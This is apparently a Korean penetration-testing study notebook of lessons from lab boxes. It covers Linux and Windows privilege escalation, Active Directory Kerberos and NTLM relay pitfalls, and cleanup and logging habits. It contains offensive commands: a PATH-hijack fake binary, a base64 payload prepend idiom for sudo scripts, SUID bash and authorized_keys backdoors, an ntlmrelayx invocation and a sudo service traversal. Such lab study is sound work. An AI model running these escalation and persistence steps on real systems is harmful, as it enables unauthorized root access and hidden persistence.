#### A-4-12. 범용 로컬 권한상승 CVE 는 «5개 반사 명령 뒤»에 던진다

**증상** — 열거(`id`·`sudo -l`·SUID·`getcap`·크론)를 끝내기 전에 polkit·DirtyPipe·PwnKit 같은 「흔한 CVE」부터 시도해 시간을 태움. **한 방이 크지만 적중률이 낮고, 실패해도 조용함.** 그 조용함이 시간을 더 태움.

[[Zipper]] 실측(mtime 재구성 — `~/PG/Zipper/CVE-2021-3560/` 디렉터리·파일 mtime + 볼트 스크린샷 파일명 시각):

| 시각 | 사건 | 근거 |
|---|---|---|
| 11:15:29 | www-data 셸 확보 → 로컬 플래그 확인 | `Pasted image 20260714111529.png` |
| **11:28** | **polkit(CVE-2021-3560) PoC clone** | `~/PG/Zipper/CVE-2021-3560/` mtime(2026-07-14 11:28:03~04) |
| 11:47:48 | `/etc/crontab` 에서 `backup.sh` 발견(linpeas) | `Pasted image 20260714114748.png` |
| 12:17:08 | root 획득 | `Pasted image 20260714121708.png` |

즉 정답 경로(크론 → 와일드카드)를 찾기 **전에** 폴킷을 먼저 집어들었음. **순손실 약 19분**(11:28 → 11:47) `[가정]`.
⚠️ **clone 만 있고 실행 로그·에러 메시지가 산출물에 없음** — 실제로 실행을 시도했는지(단순 clone 후 방치인지)조차 확정 불가이고 **실패 사유는 미상**임 `[가정]`(Ubuntu 패치 적용본이었거나 `accountsservice`/`gnome-control-center` 부재로 조건 자체가 안 맞았을 가능성).

→ **순서를 고정할 것: 5개 반사 명령(`id`·`sudo -l`·SUID·`getcap`·`crontab`) → 그래도 없으면 CVE.** 이 박스의 정답은 다섯 번째였고 `/etc/crontab` 을 `cat` 하는 데 3초가 걸림.
→ **반대 교훈도 있음 — CVE 를 던지기 전에 최소한 버전을 확인할 것.** `dpkg -l policykit-1` **한 줄**이면 시도 가치가 판별됨. **클론부터 하는 것은 순서가 뒤집힌 것임.**

#### A-4-13. root 는 잡았는데 `cat` 이 «조용히» 아무것도 안 뱉는다 — 오염된 PATH 가 상속됨

**증상** — 증거 형식대로 한 줄을 쳤는데 플래그도, 사이에 넣은 구분자(`echo ---`)도 **전혀 안 나옴.** 에러도 없음.

**⛔ `echo` 가 안 찍힌 것이 결정적 단서임.** `echo` 는 bash 내장이라 PATH 와 무관하게 항상 동작해야 하므로, **그것조차 없으면 그 명령만 실패한 것이 아니라 「줄 자체가 끊긴 것」**임.

[[PwnLab]] 실측:
```text
root@pwnlab:/tmp# whoami; id; hostname; hostname -I; date; cat /root/proof.txt; echo ---; cat /root/flag.txt
root
uid=0(root) gid=0(root) groups=0(root),1003(kane)
pwnlab
192.168.248.29 
Thu Aug 20 04:45:44 EDT 2026
root@pwnlab:/tmp# 
```
**원인** — `PATH=/tmp/.pth:$PATH /home/kane/msgmike` 로 넘긴 환경변수가 mike → msg2root → root **3단계 셸까지 그대로 상속**됨. `cat` 이 이전 단계에서 심은 가짜 `cat`(`exec /bin/bash -p`)으로 해석되고, `exec` 는 프로세스를 통째로 갈아치우므로 **그 줄의 나머지(`echo ---; cat /root/flag.txt`)를 파싱해 들고 있던 셸이 통째로 사라짐.** 새로 뜬 bash 가 프롬프트를 다시 그려 겉보기엔 「`cat` 이 아무것도 안 하고 돌아온」 것처럼 보임.

확인·복원:
```text
root@pwnlab:/tmp# echo "PATH=$PATH"; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; cat /root/proof.txt
PATH=/tmp/.pth:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
540256bedfbf87d15d54425649220e30
```
→ **PATH 하이재킹으로 셸을 얻었으면 그 즉시 PATH 를 표준값으로 되돌릴 것.** 이 박스는 `cat` 하나만 오염됐지만 `ls`·`id` 를 덮어썼다면 **이후 열거 결과 전체를 못 믿게 됨.**
→ **명령을 `; echo ---` 로 이어 쳐두면 구분이 됨** — `---` 가 찍히면 그 명령만 실패한 것이고, **안 찍히면 줄 자체가 끊긴 것**임.
— 출처: `~/PG/PwnLab/try4_fakecat_shadowed_PATH.log`

#### A-4-14. sudo 로 스크립트를 실행했는데 프롬프트가 안 돌아온다 — 페이로드 «위치»가 틀렸다

**증상** — 쓰기 가능한 스크립트에 페이로드를 넣고 `sudo` 로 돌렸는데 셸이 안 뜨고 **서버 로그만 흐름.** `Ctrl+C` 로 나와서 「권한상승 실패」로 판단하기 쉬움.

**원인은 페이로드가 아니라 «위치»임.** 대상이 블로킹 서버 스크립트면 끝에 append 한 코드에 **영원히 도달하지 못함.**
[[RubyDome]] — `require 'sinatra'` 가 classic 모드에서 `at_exit { … run! … }` 를 등록함. 스크립트 본문이 끝나면 인터프리터가 종료 훅을 돌리며 웹서버 루프에 들어가 반환하지 않음. **「스크립트 끝」이 실행 시점상 끝이 아님.**

| 대상 스크립트의 성격 | 페이로드 위치 |
|---|---|
| 블로킹 서버(Sinatra·Flask·Express·`while true`) | **맨 앞(prepend)** |
| 짧게 끝나는 배치·크론 스크립트 | 앞/뒤 아무데나 |
| 조건 분기 안에서만 도는 스크립트 | 반드시 분기 밖 최상단 |
| 파일 전체가 함수 정의뿐 | 최상단도 무의미 → `at_exit`·`END` 블록 이용 |

**prepend 관용구** — 인용이 겹치지 않게 base64 로 감싸고 `cat` 으로 이어붙임:
```bash
cp <대상> /tmp/x.bak
echo <B64> | base64 -d > /tmp/p; echo >> /tmp/p
cat /tmp/p <대상> > /tmp/n; cp /tmp/n <대상>
```
- `echo >> /tmp/p` 를 빠뜨리면 페이로드와 첫 줄이 붙어 문법 오류가 남
- **`cp` 로 덮어쓸 것** — 기존 파일을 `O_TRUNC` 로 열어 inode·소유자·퍼미션이 유지됨. `mv` 는 새 파일이라 소유자가 바뀌어 흔적이 남음(C-5)
- **`exec` 를 쓸 것** — `system("/bin/bash")` 는 자식을 띄우고 돌아오지만 `exec` 는 프로세스 이미지를 치환해 root uid 를 그대로 물려받고 `at_exit` 훅도 등록 전에 사라짐

**명령은 `sudo -l` 출력과 글자 단위로 일치시킬 것.** 절대경로가 아니거나(`sudo ruby …`) 상대경로면(`cd app; sudo ruby app.rb`) 거부될 수 있음 — sudoers 는 문자열과 경로로 매칭함(A-43).

#### A-4-15. 관리자 그룹에 넣었는데 `whoami /priv` 가 초라하다 — UAC 원격 토큰 필터링

**증상** — `net localgroup administrators <user> /add` 를 분명히 실행했는데 evil-winrm 으로 붙으면 특권이 `SeChangeNotifyPrivilege`·`SeIncreaseWorkingSetPrivilege` 둘뿐임.

**원인은 그룹 추가 실패가 아니라 UAC 원격 제한(`LocalAccountTokenFilterPolicy`)임.** Windows 는 네트워크 로그온하는 **로컬** 계정에 필터링된 토큰을 발급하고 `Administrators` SID 를 deny-only 로 표시함. 예외는 **RID 500**(내장 `Administrator`) — `FilterAdministratorToken` 기본 `0`.

**오판 비용** — 「그룹 추가가 실패했구나」로 읽고 웹셸로 돌아가 `net localgroup` 을 다시 치고, 안 되면 계정을 지웠다 다시 만들다 보면 **여기서 쉽게 20~30분이 날아감.**

**1초 판별**
```powershell
whoami /groups | findstr /i administrators
```
`BUILTIN\Administrators` 가 보이는데 `whoami /priv` 가 초라하면 토큰 필터링임. 해당 줄에 `Group used for deny only` 가 있으면 확증. **그룹을 다시 건드리지 말 것.**

**넘는 길 넷** — ① RID 500 으로 접속 ② `LocalAccountTokenFilterPolicy=1`(`/d 0` 으로 원복 가능) ③ SAM/SYSTEM 덤프 → PtH(아무것도 안 바꿈) ④ 도메인 계정.
⚠️ **Administrator 비밀번호 변경은 되돌릴 수 없으므로 마지막 수단임**(A-4-11).

**출처** — [[Butch]](`~/.zsh_history:2181` 4leaf → `:2182` administrator 순서가 이 판단을 증언함).

**한 단계 앞의 증상을 먼저 배제할 것 — 「재로그온을 안 한 것」.**

그룹 멤버십은 **토큰 발급 시점에 스탬프**됨. `net localgroup administrators` 에 이름이 보여도 **현재 세션의 토큰은 옛것**이라 관리자 파일 접근이 거부됨. 세션을 끊고 다시 붙으면 새 토큰에 반영돼 그대로 읽힘.

[[Vault]] 실측 — GPO 로 로컬 관리자를 심고 `gpupdate /force` 를 친 뒤 `net localgroup administrators` 에 `anirudh` 가 보였으나, **evil-winrm 세션을 새로 연 뒤에야** `C:\Users\administrator\desktop\proof.txt` 가 읽혔음(`파일보관\Pasted image 20260708132134.png` → `…132320.png`).

**판별 순서:**
1. 세션을 **끊고 다시 붙음** → 읽히면 그냥 토큰 문제였음(여기서 끝)
2. 그래도 `whoami /priv` 가 초라하면 → 이 절 본문(UAC 원격 토큰 필터링)

→ **1번을 건너뛰고 UAC 로 의심하면 `LocalAccountTokenFilterPolicy` 를 건드리는 등 불필요한 변경을 하게 됨.**

#### A-4-16. GTFOBins 로 띄운 root 셸이 즉시 죽는다

**증상** — GTFOBins 페이로드가 root 셸을 띄웠는데 곧바로 종료되거나 입력을 못 받음.

| 원인 | 대응 |
|---|---|
| 부모가 비대화형 컨텍스트 — 웹셸이나 파이프 안에서 실행 | **반드시 TTY 가 있는 리버스셸 안에서** 실행할 것(A-38) |
| 띄운 셸이 stdin 을 상속받지 못함 | 셸을 잡는 대신 지속성을 심음 — `cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash` → `/tmp/rootbash -p`(`-p` 누락 시 euid 소실, B-33) |
| 페이로드가 인자를 추가로 받아 오작동 | 인자 없이 되는 형태를 고름. `service` 는 서비스명 하나만 넘기면 됨(B-3-14) |

**root 를 잡으면 먼저 되돌아올 길부터 만들 것.**
```bash
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash    # SUID 백도어 (랩 한정)
mkdir -p /root/.ssh && echo '<내 공개키>' >> /root/.ssh/authorized_keys
```
리버스셸은 언제든 끊기고, root 셸이 끊겨 익스플로잇 전체를 처음부터 다시 도는 것이 시험에서 제일 아까운 시간임(A-32 · A-65).
⚠️ 위 둘은 **랩이라 남겨둔 것**이고, 실제 침투 테스트에서는 이런 흔적을 반드시 보고서에 기록하고 회수함(C-5).

**출처** — [[Crane]](이 박스에서는 `sudo /usr/sbin/service ../../../../../bin/bash` 가 그대로 대화형 root 셸을 줬음).

#### A-4-17. Windows 셸을 잡았는데 어느 특권을 써야 할지 모르겠다 — 던지기 전에 3초·10초 판정으로 후보를 지운다

**증상** — SYSTEM 후보가 여럿인데 하나씩 던져보며 시간을 태움. 실패가 조용해서 더 태움.

[[Heist]] 는 `svc_apache$` 셸을 잡은 직후 후보 셋 중 둘을 **명령을 던지기 전에** 지웠다.

**후보 1 — Potato 계열(PrintSpoofer/GodPotato/SweetPotato). 판정 3초.**
`whoami /priv` 에 `SeImpersonatePrivilege` 가 있는가. Potato 계열은 명명 파이프로 SYSTEM 토큰을 가장한 뒤 그 토큰으로 프로세스를 만드는 공격이라 이 특권이 전제다. 없으면 토큰을 훔쳐도 쓸 수 없다. [[Heist]] 의 특권은 4개(`SeMachineAccount`·`SeRestore`·`SeChangeNotify`·`SeIncreaseWorkingSet`)뿐이라 [[Squid]]·B-46 의 반사가 즉시 죽었다.

**후보 2 — DCSync. 판정 10초.**
`domains.json`(또는 BloodHound GUI 의 도메인 노드 → Inbound Object Control)에 **`GetChanges` + `GetChangesAll` 을 «동시에»** 가진 **비기본** principal 이 있는가. 둘 중 하나만으로는 성립하지 않는다(A-53 과 같은 판정).
```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ jq -r '.data[] | (.Aces//[])[] | select(.RightName|test("GetChanges"))
           | [.RightName,.PrincipalSID,.PrincipalType] | @tsv' 20260708141821_domains.json
GetChanges	S-1-5-21-537427935-490066102-1511301751-498	Group
GetChangesAll	S-1-5-21-537427935-490066102-1511301751-516	Group
GetChangesInFilteredSet	HEIST.OFFSEC-S-1-5-32-544	Group
GetChanges	HEIST.OFFSEC-S-1-5-32-544	Group
GetChangesAll	HEIST.OFFSEC-S-1-5-32-544	Group
GetChangesInFilteredSet	HEIST.OFFSEC-S-1-5-9	Group
GetChanges	HEIST.OFFSEC-S-1-5-9	Group
```
전부 기본 principal 이다 — `-498` Enterprise Read-only Domain Controllers, `-516` Domain Controllers, `S-1-5-32-544` BUILTIN\Administrators, `S-1-5-9` Enterprise Domain Controllers. `svc_apache$`(`-1105`)도 `WEB ADMINS`(`-1104`)도 없다. `impacket-secretsdump` 를 던져봤자 `DRSUAPI` 권한 거부로 끝난다.
→ **이 확인은 10초고, secretsdump 를 돌려 실패를 보는 것은 1~2분 + 오판의 여지다.**

**남은 후보 3 이 `SeRestorePrivilege` 였고 그것이 정답이었다.**
→ 일반화: **특권 이름 하나가 곧 경로다.** Windows 셸을 잡으면 `whoami /priv` 가 첫 명령이고, 그래프(BloodHound)는 시작점이지 전부가 아니다 — **URA·로컬 특권은 BloodHound 수집 대상이 아니다.**

#### A-4-18. sudo NOPASSWD 대상이 GTFOBins 에 없다 — 「이 프로그램이 뭘 하는가」로 사고한다

**GTFOBins 는 목록이지 사고법이 아님.** 없으면 직접 추론할 것 — 질문은 **「이 프로그램이 평소에 하는 일이 뭔가? 그 일을 root 권한으로 하면 무엇이 되는가?」** 하나임.

| 프로그램이 평소에 하는 일 | root 권한이면 |
|---|---|
| 파일을 읽어서 보여줌(웹 UI·뷰어·로그 도구) | **임의 파일 읽기**(B-1-27) |
| 파일을 씀(백업·설정 저장) | **임의 파일 쓰기** → `/etc/passwd`·`authorized_keys`·크론(B-1-48) |
| 하위 프로세스를 띄움(`-e`·`--exec`·플러그인) | 직접 명령 실행 |
| 네트워크로 들음 | **그 서비스의 모든 결함이 root 결함이 됨** |

[[Clue]] 가 마지막 행의 표본임 — 새 취약점이 하나도 없고 재료가 둘뿐이었음: ⓐ `cassie` 가 `sudo NOPASSWD` 로 `/usr/local/bin/cassandra-web` 실행 가능 ⓑ cassandra-web 0.5.0 에 임의 파일 읽기(진입점과 **같은** 취약점).
```text
기존  cassie 권한 인스턴스 :3000  ──traversal──▶ cassie 가 읽을 수 있는 파일만
신규  root  권한 인스턴스 :9999  ──traversal──▶ 파일시스템 전체 ← 개인키
```
**같은 취약점을 «다른 권한으로 다시 거는 것»** 이 답이었음. 이미 뚫은 취약점을 권한상승 단계에서 재사용할 수 있는지 반드시 한 번 물을 것.
⚠️ 이 명령 자체가 자격증명을 다시 노출함 — `-p <password>` 가 argv 로 넘어가 그 프로세스의 `/proc/<pid>/cmdline` 에도 평문으로 남음(진입점 결함의 자기 재현). 실전이라면 인지하고 쓸 것.

### A-5. Active Directory

#### A-51. AD 박스에서 막히면 «취약점»이 아니라 넷을 먼저 본다

**확인 순서**
1. **시계** — `KRB_AP_ERR_SKEW` → `sudo rdate -n <DC>`. **현행 Kali 에 `ntpdate` 는 패키지조차 없음**
2. **이름 해석** — `getent hosts <FQDN>`. SPN 은 IP 가 아니라 FQDN 임
3. **`KRB5CCNAME`** — **절대 경로**로 export 후 `klist` 확인. impacket `-k` 는 *"based on target parameters"* 로 SPN 을 조립함
4. **박스 IP 변경**(리버트)

([[Resourced]] · [[Hutch]] — 두 박스 모두 세션이 바뀌며 IP 가 재배정됐고 노트 안에 두 IP 가 공존함)

**⚠️ `-k` 를 치기 전에 «항상» `klist` 로 확인할 것.** ccache 가 비면 impacket 은 조용히 다른 인증으로 넘어가거나 애매한 에러를 냄.
[[Nagoya]] — `export KRB5CCNAME=$PWD/Administrator.ccache\`(**줄 끝 백슬래시로 다음 줄과 연속**)가 `~/.zsh_history` 에 **두 번** 남았고 그 사이에 `impacket-mssqlclient nagoya.nagoya-industries.com -k` 가 섞여 있음. export 가 줄 연속으로 먹혀 환경변수가 제대로 안 잡힌 상태에서 `-k` 를 쳤을 가능성이 큼. `[가정]` zsh 히스토리는 세션 종료 시 기록되고 `hist_ignore_dups` 로 중복이 접히므로 **정확한 순서는 단정하지 않음** — 남은 것은 「이 줄을 두 번 다시 쳤다」는 사실뿐임. 인용부호·줄 끝 `\` 함정 자체는 A-3-12.


**항목 2(이름 해석)에 붙일 것 — `-ns` 는 Kerberos 를 구제하지 않는다.**
`bloodhound-python -ns <DC-IP>` 는 **LDAP 조회에 쓰는 리졸버**만 바꾼다. **Kerberos 단계는 시스템 리졸버로 `dc.<도메인>:88` 을 찾는다.** [[Vault]] 에서 관측된 원문:
```text
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication.
         Error: [Errno Connection error (dc.vault.offsec:88)] [Errno -2] Name or service not known
```
NTLM 이 살아 있으면 폴백해 수집이 되지만, **NTLM 비활성 도메인이면 여기서 수집 자체가 실패한다.** 그때 필요한 것이 `/etc/hosts` 이고 **세 이름을 다 넣는다** — 도구마다 요구 형태가 다르다(impacket 계열은 FQDN, `evil-winrm -r` 은 realm, 일부는 짧은 호스트명):
```text
192.168.120.165  DC01.heist.offsec  heist.offsec  DC01
```
SPN 은 `서비스클래스/호스트FQDN` 형태라 Kerberos 는 IP 로 티켓을 요청할 수 없다. `-k` 인증·`impacket-getST`·`evil-winrm -r` 전부 이 등록이 없으면 죽는다.

**항목 1(시계)에 붙일 것 — 시계를 만지기 «전에» 용의자에서 배제하라.**
`nmap -sCV -A` 가 이미 세 축으로 답을 준다 — `ssl-date` 의 `Ns from scanner time`, `smb2-time` 의 `date:`, 88 포트 배너의 `server time:`. [[Heist]] 는 셋 다 일치했고(`0s from scanner time`) Kerberos 를 한 번도 쓰지 않았다. **차이가 5분 이내면 시계는 용의자가 아니다** — 이 확인 없이 시계부터 만지면 진짜 원인(FQDN 미등록·SPN 오타·NTLM 폴백)을 놓친다.
⚠️ **`ntpdate` 도 `faketime` 도 현행 Kali 에 없다**(2026-08-26 실측 — `ntpdate` 는 `apt-cache policy` 상 **Candidate 조차 없음**, `faketime` 미설치). 쓸 수 있는 것은 `sudo rdate -n <DC-IP>` 뿐이다.

#### A-52. 자격증명은 맞는데 «어떤 대화형 서비스도» 로그인을 안 받는다

**증상** — nxc·nxc-sweep 에서 자격증명 자체는 `[+]`(SMB 등)로 확인됐는데 WinRM·RDP 로그인은 전부 `[-]`.

[[Nagoya]] 실측 — `svc_mssql:Service1` 을 깬 직후:
- `evil-winrm -u SVC_MSSQL -p Service1` 실패(nxc 도 `WINRM [-]`) — **Remote Management Users 미소속**
- `xfreerdp` 도 실패. 단 nxc 는 `RDP [+]` 로 자격증명 자체는 유효하다고 판정했음 — **실패 원인이 대화형 로그온 권한 거부인지 다른 것인지는 원본 노트에도 `xfreerdp` 출력이 안 남아 기록에 없음** `[가정]`
- `ssh -L 13389:…` 로 RDP 를 로컬로 당겨오려던 흔적 후 접음

→ **서비스 계정은 대화형·원격 로그온이 막혀 있는 것이 정상임.** 「비밀번호를 깼다」와 「로그인할 수 있다」는 다른 문제 — **로그인이 막히면 그 계정을 로그인 수단이 아니라 «암호 재료»로 재해석할 것**(B-56 실버·골든티켓).
→ **A-24 와의 차이** — A-24 는 「다른 서비스에 돌려보면 통한다」는 사례이고, 이것은 **어떤 대화형 서비스에도 안 통하는 것이 정상인 계정 부류**(AD 서비스 계정)를 다룸.

#### A-53. DC 에서 `whoami` 가 SYSTEM 이 아니라 `DOMAIN\HOST$` 로 나온다 — 실패가 아님

**증상** — 권한상승 페이로드 실행 후 리버스셸의 `whoami` 가 `nt authority\system` 이 아니라 `<도메인>\<호스트명>$`(컴퓨터 계정)로 나와 실패로 오인.

[[Nagoya]] 실측 — PrintSpoofer 로 사칭된 세션이 `nagoya-ind\nagoya$` 로 떨어졌음(출처: `파일보관/Pasted image 20260707105454.png`). BloodHound 수집분(`20260706153247_domains.json`)의 도메인 객체 ACE 를 보면 `Domain Controllers` 그룹이 `GetChangesAll` 을, `Enterprise Domain Controllers`(S-1-5-9)가 `GetChanges` 를 가짐. **DCSync 는 이 둘이 «모두» 있어야 성립**하는데 DC 머신 계정은 양쪽에 다 들어가므로 결과적으로 도메인 관리자와 실질적으로 동등함 — `GetChangesAll` 하나가 곧 DCSync 인 것은 아님. 실제로 Administrator 데스크톱을 그대로 읽었음.

`[가정]` 왜 SYSTEM 표기가 아니라 머신 계정으로 떨어졌는지는 **원본 노트에 확인 기록이 없음** — 사칭된 토큰이 로컬 SYSTEM 이 아니라 네트워크 컨텍스트의 머신 계정이었을 가능성.
→ **DC 에서 `whoami` 결과가 `DOMAIN\HOST$` 면 그 자체로 성공 신호일 수 있음.** SYSTEM 이 안 나왔다고 실패로 판단하지 말 것.

#### A-54. 강제 인증 해시는 잡았는데 릴레이가 안 통한다 — 릴레이 가능 여부는 3초에 판정한다

**증상** — Responder/PetitPotam 등으로 NetNTLMv2 를 잡았는데 `ntlmrelayx` 가 아무것도 못 함.

**판정 순서 — 이 셋 중 하나라도 걸리면 릴레이는 죽고 오프라인 크랙만 남는다.**
1. `nmap` 의 `smb2-security-mode` 가 `Message signing enabled and required` 인가 → **SMB 릴레이 죽음.** DC 는 기본이 필수임
2. `nxc smb <대역> --gen-relay-list targets.txt` 로 서명이 꺼진 호스트를 뽑는다 (⚠️ [[Heist]] 에서는 **실행하지 않았음 — 관측 없음**)
3. **넘길 「다른 호스트」가 있는가** — MS16-075 이후 동일 호스트로의 NTLM 릴레이는 커널이 거부한다. 호스트가 한 대뿐인 랩에서는 릴레이할 B 가 애초에 없다

[[Heist]] 실측 — 셋 다 걸렸다. `impacket-ntlmrelayx -t ldaps://192.168.120.165 -debug --dump-gmsa --no-dump --no-da --no-acl --no-validate-privs` 를 실제로 던졌음. **발상 자체는 맞았으나**(`--dump-gmsa` = enox 인증을 LDAPS 로 릴레이해 gMSA 비밀번호를 뽑자) 인증이 오는 곳도 DC01, 릴레이 대상도 DC01 이었고 `computers.json` 에 호스트는 `DC01.HEIST.OFFSEC` **하나뿐**이었음. `nmap.log` 의 `Message signing enabled and required` 한 줄을 먼저 읽었으면 이 시도를 통째로 건너뛸 수 있었음.

**LDAP(389)/LDAPS(636) 릴레이도 Server 2019 DC 기본 정책상 봉인·채널 바인딩을 요구한다** — 단 [[Heist]] 에서 **관측된 것은 아니고 일반적 기본값** `[가정]`.

→ **릴레이는 「호스트가 둘 이상」일 때의 도구다.** 단일 호스트 랩에서는 크랙이나 ACL 이 답이다. 반대로 시험 AD 세트(보통 DC 1 + 멤버 2)에서는 릴레이가 훨씬 강력해진다 — **크랙 불가능한 컴퓨터 계정 인증도 릴레이는 그대로 쓴다.**
→ 그리고 나가는 값이 **`NTProofStr`**(챌린지에 NT 해시를 키로 건 HMAC-MD5)이라는 것이 이 갈림의 근본 이유다. 평문도 NT 해시도 아니라 그대로 재사용할 수 없고, **릴레이(중계) 아니면 오프라인 크랙(재계산)** 둘 중 하나뿐이다.

### A-6. 판단·검증 (메타)

#### A-61. 관측은 맞는데 결론이 어긋난다

**관측과 결론은 다른 작업임. 갈라서 검증할 것.** 관측이 탄탄하면 결론까지 통과시키기 쉬움.

실측([[Monster]], 2026-08-20): 「`mysqld` 는 서비스가 아니다」는 **옳은 관측**. 거기 붙은 「그러므로 XAMPP 경로는 무의미하다」는 **틀린 결론** — 실제로 `httpd.exe`·`mysqld.exe` 가 `Authenticated Users:(M)` 로 **쓰기 가능**했고 그게 가장 정답에 가까운 리드였음. 감사자도 총괄도 관측의 견고함에 기대어 결론을 검증하지 않았음.

**두 줄로 쪼개 물을 것** — ① 관측이 사실인가 ② 그 관측이 그 결론을 **지지하는가**. 둘째를 건너뛰면 잘 조사된 오답이 그대로 통과함.

**「쓰기가 됐다」에서 「DB 가 root 다」를 추론하지 말 것.** [[Hawat]] — `INTO OUTFILE` 로 `/srv/http` 에 웹셸이 써졌고 그 웹셸이 `uid=0` 이라 「mysqld 가 root」로 넘어갈 뻔했음. 확인해 보니 아님:
```text
mysql    mariadbd
```
`load_file('/root/proof.txt')`·`load_file('/etc/shadow')` 가 전부 `NULL` 인 것이 같은 증거임(`~/PG/Hawat/probe.py` 의 `== mysqld privilege level ==` 블록이 정확히 이것을 물음).
쓰기가 된 진짜 이유는 **대상 디렉터리가 0777** 이어서였고, 0755 root 인 `/usr/share/nginx/html` 에는 조용히 실패했음. root 웹셸이 된 이유는 **`/etc/nginx/nginx.conf` 의 `user root;`** 로 nginx·php-fpm7 이 둘 다 root 구동이기 때문임 — MySQL 과 무관함.
→ **관측(파일이 써졌다 · 웹셸이 root 다)은 둘 다 옳았고 그 사이를 잇는 인과가 틀렸던 사례.** 「무엇이 그 파일을 썼는가」와 「무엇이 그 파일을 실행하는가」는 서로 다른 프로세스임.

⚠️ **`@@secure_file_priv IS NULL` 이 TRUE 인데도 파일 쓰기가 성립했음**([[Hawat]]). 교과서대로면 `NULL` 은 파일 입출력 전면 차단임. **변수값보다 실측을 믿을 것** — `/tmp` 에 마커 파일 하나를 쓰는 것이 가장 빠른 판정임. `[가정]` 이 오라클의 응답은 산출물에 남아 있지 않음(`probe.py` 는 `secure_file_priv` 를 묻지 않음) — 원 노트 기록임.

**⛔ 설명이 안 되는 관측을 그냥 넘기지 말 것 — 어긋남은 대개 우연이 아니라 «구조의 흔적»임.**

포트가 두 개, 버전이 두 개, 응답이 두 종류 — 이런 불일치를 「표시 오류」로 치우면 그 자리에 진짜 답이 있을 수 있음. 시험장에서 전부 파고들 시간은 없으나 **「왜 그런지 모르겠다」고 인지는 하고 있어야** 나중에 막혔을 때 그 지점으로 돌아옴.

[[pyLoader]] 실측 — 정보 페이지는 `WebUI Port: 8000`, nmap 은 `9666`. 당시에는 「설정값과 실제가 어긋나는 흔한 함정」([[Squid]] 의 MariaDB 3307 계열)으로 읽고 넘겼고, 익스플로잇 `-w` 에 nmap 값을 넣었으므로 **결과적으로 문제는 없었음.** 그러나 그 불일치가 곧 **취약점의 절반**이었음 — 두 포트는 같은 프로세스의 서로 다른 리스너이고, 9666 프록시가 `local_check` 의 `REMOTE_ADDR` 판정을 무너뜨리는 부품이었음(B-15).
→ **시간 손실은 없었으나 이해의 공백은 있었음.** 그 박스가 `extern=False` 로 구성돼 9666 이 루프백에만 열려 있었다면 익스플로잇은 `403 Forbidden` 을 받았을 것이고, **원인을 모른 채 「CVE 가 안 먹는다」로 오판**했을 것임.

#### A-62. 원복 검증이 «엉뚱한 파일»을 봤다

**파일명을 파라미터로 받는 기능은 그 값을 «그대로» 경로에 이어붙이는 경우가 흔함.** 목록이 제시하는 이름과 다른 이름을 보내면 **존재하지 않는 파일이 새로 생성**되고, 주입은 그 새 파일에 들어감.

[[CVE-2023-46818]] — `lang_file` 을 `en_` 접두 없이 `help_faq_sections_list.lng` 로 보낸 탓에 주입은 **새로 생성된 파일**에 들어갔는데, 정리 때는 **배포판 파일 `en_help_faq_sections_list.lng` 의 md5·`php -l`·grep 을 확인하고 「원복 완료」로 판정**함. 배포판 파일은 애초에 손댄 적이 없어 당연히 깨끗했던 것.

- **자기모순 신호** — 복구 스크립트가 `test=hello` 를 써넣었는데 그 파일 `grep -c test` 가 **0**
- **원복 검증은 「내가 보낸 파일명」이 아니라 「앱이 실제로 쓴 경로」로 할 것.** 그 경로는 대개 편집 화면 legend·에러 메시지에 그대로 찍혀 있음
- **시험 보고서의 「정리」 항목이 통째로 틀어지는 자리임**

#### A-63. 익스플로잇은 통했는데 «무엇을 보냈는지» 기록이 없다

**증상** — 결과 파일은 있는데 **요청 본문·명령행이 없음.** 노트를 쓸 때 재현 문자열을 못 실음.

[[Graph]] 실측 — 잃은 것 넷: ⓐ GraphQL 주입 payload(`gql/dump_users.json` 은 **응답만** 남음. 헤드리스 스크린샷에도 URL 바가 없어 **끝내 복원되지 않음**) ⓑ 1차 john 의 명령행 ⓒ 심은 josh 해시의 **평문**과 그 해시를 만든 명령 ⓓ `root_hash.txt` 를 **읽어낸 명령·세션**.
원인은 하나 — **「통했다」 직후 다음 단계로 바로 넘어감.** 성공한 요청일수록 파일로 남겨야 하는데 성공의 흥분이 그 한 줄을 건너뛰게 만듦.

**보험 — 실행 «직후» 바뀐 대상을 한 묶음으로 뜰 것.** 익스플로잇을 던졌으면 그 자리에서 `/etc/shadow` · `ps auxf` · 대상 파일 `ls -la` 를 떠 둘 것. **「실행 직후 스냅샷」이 「실행 로그」를 상당 부분 대신함.**

[[Graph]] 에서 실제로 구제해 준 것들 — root 획득 후 돌린 `harvest.sh` 가 `/etc/shadow` 전문·`ps auxf`·`/tmp` 목록을 떠 놓아서 사후에 인과가 복원됨:
- 조작된 shadow 두 행에서 **성공한 페이로드 문자열 자체가 역산**됨(`99999:7:::` + 개행 + `josh:$6$Gr4phSlt$…:19000:0:99999`)
- `/tmp` 목록의 `.p.sh`(575B, 02:00) → `.p.out`(415B, 02:01) → `.p2.sh`(443B, 02:04) → `.shadow_snapshot_afterinject`(josh 소유 1688B, 02:05)가 **두 번 시도했다는 사실과 josh 세션의 존재**를 그대로 보여줌. 세션 «캡처»는 여전히 없으나 josh 세션의 존재와 shadow 읽기 사실은 이것으로 확정됨
- Kali 에 저장한 스크립트 사본이 손상돼 있었다는 사실조차 그 스냅샷의 `bogus` 행과 대조해서야 확정됨(B-84)

**그래도 스냅샷이 못 메우는 구간이 남음** — 위 넷 중 GraphQL payload 와 심은 해시의 평문은 대신 기록해 줄 대상이 없어 **영구 손실**임.

**「성공한 쪽」의 응답만 골라 안 남기는 사고가 반복됨.** [[Outdated]] — CVE-2022-36446 요청 중 **실패한 것**(`exploit_resp.html`, Referer 없음 → 거부)과 **중간 시도**(`resp2.html`, 리버스셸 페이로드 → 명령은 돌았으나 콜백 없음)는 남았는데, **실제로 root 를 만든 rootbash 드롭 요청의 응답은 저장되지 않음.** 그래서 노트가 「명령이 root 로 실행됐다」의 근거로 **한 단계 앞선 요청의 응답**을 인용해야 했음.
→ 원인은 위와 같음 — **「통했다」 직후 다음 단계로 바로 넘어감.** 실패 응답을 남기는 습관은 이미 있었으나 성공 응답에는 적용되지 않았음.
